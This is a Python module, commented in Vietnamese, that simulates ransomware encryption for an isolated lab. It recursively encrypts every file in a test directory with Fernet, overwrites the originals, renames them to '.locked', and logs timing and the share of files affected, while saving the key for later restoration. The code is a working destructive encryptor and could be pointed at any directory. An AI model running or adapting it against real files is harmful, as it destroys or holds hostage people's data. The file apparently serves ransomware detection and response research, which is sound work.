import json
import os
from datetime import datetime

from cryptography.fernet import Fernet

# ============================================================
# file_encryptor.py
# Module mo phong hanh vi ma hoa file cua ransomware
# Chi chay trong moi truong lab co lap
# Chi tac dong den thu muc test_data
# MITRE ATT&CK: T1486 - Data Encrypted for Impact
# ============================================================

LOCKED_EXTENSION = ".locked"


def create_key():
    """
    Tao key AES ngau nhien.
    Fernet su dung AES-128-CBC ben trong.
    Output: key dang bytes
    """
    return Fernet.generate_key()


def save_key(key, backup_dir):
    """
    Luu key vao file de cleanup.py co the doc lai.
    Input:  key (bytes), duong dan thu muc backup
    Output: file backup/key.txt
    """
    os.makedirs(backup_dir, exist_ok=True)
    key_path = os.path.join(backup_dir, "key.txt")
    with open(key_path, "wb") as f:
        f.write(key)
    print(f"[KEY] Saved to: {key_path}")
    return key_path


def encrypt_single_file(filepath, fernet):
    """
    Ma hoa mot file duy nhat.
    Input:  duong dan file goc, fernet object (chua key)
    Output: duong dan file da ma hoa (.locked)
    Quy trinh:
      1. Doc noi dung file goc (dang bytes)
      2. Ma hoa bang Fernet (AES)
      3. Ghi de noi dung da ma hoa
      4. Doi ten file: them .locked
    """
    # Doc noi dung goc
    with open(filepath, "rb") as f:
        original_data = f.read()

    # Ma hoa
    encrypted_data = fernet.encrypt(original_data)

    # Ghi de file voi noi dung da ma hoa
    with open(filepath, "wb") as f:
        f.write(encrypted_data)

    # Doi ten file: them .locked
    locked_path = filepath + LOCKED_EXTENSION
    os.rename(filepath, locked_path)

    return locked_path


def scan_files(target_dir):
    """
    Quet toan bo file trong thu muc target.
    Bo qua cac file .locked (da ma hoa roi).
    Output: danh sach duong dan file
    """
    file_list = []
    for root, dirs, files in os.walk(target_dir):
        for filename in files:
            if not filename.endswith(LOCKED_EXTENSION):
                filepath = os.path.join(root, filename)
                file_list.append(filepath)
    return file_list


def encrypt_directory(target_dir, backup_dir, log_dir):
    """
    Ham chinh: ma hoa toan bo file trong thu muc target.
    Input:
        target_dir : thu muc chua file test (test_data/)
        backup_dir : noi luu key va danh sach file
        log_dir    : noi luu log thuc nghiem
    Output:
        dict chua ket qua thuc nghiem
    """

    print("=" * 50)
    print("[START] Ransomware Simulator - File Encryptor")
    print(f"[TARGET] {target_dir}")
    print("=" * 50)

    # Ghi nhan thoi diem bat dau
    start_time = datetime.now()
    print(f"[TIME] Start: {start_time.strftime('%H:%M:%S.%f')}")

    # Tao key va luu vao backup
    key = create_key()
    save_key(key, backup_dir)
    fernet = Fernet(key)

    # Quet danh sach file
    file_list = scan_files(target_dir)
    total_files = len(file_list)
    print(f"[SCAN] Found {total_files} files to encrypt")

    # Ma hoa tung file
    encrypted_files = []
    encrypted_map = {}  # {file_goc: file_locked}

    for i, filepath in enumerate(file_list, 1):
        try:
            locked_path = encrypt_single_file(filepath, fernet)
            encrypted_files.append(locked_path)
            encrypted_map[filepath] = locked_path
            print(f"[{i:03d}/{total_files}] Encrypted: {os.path.basename(locked_path)}")

        except Exception as e:
            print(f"[ERROR] Could not encrypt {filepath}: {e}")

    # Luu danh sach file da ma hoa (de cleanup.py dung)
    os.makedirs(backup_dir, exist_ok=True)
    map_path = os.path.join(backup_dir, "encrypted_files.json")
    with open(map_path, "w") as f:
        json.dump(encrypted_map, f, indent=2)
    print(f"[BACKUP] File map saved: {map_path}")

    # Ghi nhan thoi diem ket thuc
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()

    # Tong ket
    result = {
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat(),
        "duration_seconds": duration,
        "total_files": total_files,
        "encrypted_count": len(encrypted_files),
        "affected_ratio": len(encrypted_files) / total_files if total_files > 0 else 0,
    }

    print("=" * 50)
    print(f"[DONE] Encrypted {len(encrypted_files)}/{total_files} files")
    print(f"[TIME] Duration: {duration:.2f} seconds")
    print(f"[RATIO] Affected: {result['affected_ratio'] * 100:.1f}%")
    print("=" * 50)

    # Luu log
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "encryption_log.json")
    with open(log_path, "w") as f:
        json.dump(result, f, indent=2)
    print(f"[LOG] Saved: {log_path}")

    return result


# Chay thu truc tiep
if __name__ == "__main__":
    BASE = r"C:\ransomware_simulator"
    TARGET = os.path.join(BASE, "test_data")
    BACKUP = os.path.join(BASE, "backup")
    LOG_DIR = os.path.join(BASE, "logs")

    encrypt_directory(TARGET, BACKUP, LOG_DIR)
